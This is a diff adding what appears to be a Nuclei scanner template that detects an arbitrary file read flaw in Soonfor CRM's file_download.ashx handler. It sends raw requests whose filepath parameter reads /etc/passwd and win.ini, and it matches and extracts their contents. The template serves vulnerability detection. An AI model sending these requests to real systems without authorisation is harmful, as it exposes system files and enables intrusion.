@@ -1,0 +1,36 @@
+id: soonfor-crm-file-download-ashx-anyfile-read
+info:
+  name: Soonfor CRM Arbitrary File Read via file_download.ashx
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /Web/common/Handler/file_download.ashx?filepath=C:/Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /Web/common/Handler/file_download.ashx?filepath=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        condition: and
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        condition: and
+        words:
+          - "[files]"
+          - "bit app support"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*\n'
+          - '\[files\].*\n'
